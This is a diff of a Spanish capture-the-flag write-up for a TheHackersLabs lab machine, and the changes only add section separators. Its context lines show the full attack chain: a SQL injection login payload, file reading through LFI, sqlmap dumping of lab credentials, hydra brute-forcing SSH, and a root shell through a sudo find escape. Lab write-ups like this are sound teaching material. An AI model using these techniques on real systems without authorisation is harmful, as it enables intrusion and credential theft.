@@ -3,7 +3,9 @@
 **Plataforma:** TheHackersLabs  
 **Sistema:** Ubuntu 24.04.1 LTS  
 **IP:** 192.168.1.148  
-**Objetivo:** Obtener flag.txt y root.txt
+**Objetivo:** Obtener flag.txt y root.txt  
+
+---
 
 ## Reconocimiento
 
@@ -34,6 +36,8 @@ nmap -p22,80 -sCV -vvv 192.168.1.148 -oN tcp_scan.txt
 - `22/tcp` - OpenSSH 9.6p1
 - `80/tcp` - nginx 1.24.0, título "AFN"
 
+---
+
 ## Enumeración Web
 
 ```bash
@@ -47,11 +51,15 @@ feroxbuster -u http://192.168.1.148/ -w /usr/share/seclists/Discovery/Web-Conten
 - `admin.php`
 - `images/`
 
+---
+
 ## SQL Injection en login.php
 
 Credenciales: `admin` / `' OR '1'='1`
 
 Se accede a `admin.php` que contiene un diario del desarrollador. Menciona una página oculta para leer archivos internos, codificada en base64.
+
+---
 
 ## LFI - Lectura de archivos
 
@@ -79,6 +87,8 @@ El código fuente revela la pista:
 <!-- Si alguien leyera el archivo donde se encuentran los usuarios y usara la herramienta hydra para atacar nuestro servicio ssh... Bueno, mañana me encargare de ello -->
 ```
 
+---
+
 ## Extracción de la BD con sqlmap
 
 ```bash
@@ -94,6 +104,8 @@ sqlmap -u 'http://192.168.1.148/login.php' --batch --dump --forms
 | 3  | Jaime_P   | jaime      | jaime   |
 | 4  | Richard   | qwertyu    | Ricardo |
 
+---
+
 ## Fuerza bruta SSH con hydra
 
 ```bash
@@ -102,6 +114,8 @@ hydra -L users.txt -P /usr/share/wordlists/rockyou.txt -t 20 ssh://192.168.1.148
 
 **Credenciales:** `superadministrator:princesa`
 
+---
+
 ## Flag de usuario
 
 ```bash
@@ -109,6 +123,8 @@ ssh superadministrator@192.168.1.148
 cat flag.txt   # <REDACTED> → "sudo -l"
 cat recordatorio.txt  # Pista de GTFOBins
 ```
+
+---
 
 ## Escalada de privilegios
 
@@ -119,6 +135,8 @@ sudo -l
 sudo find . -exec /bin/sh \; -quit
 # whoami → root
 ```
+
+---
 
 ## Flag de root
 
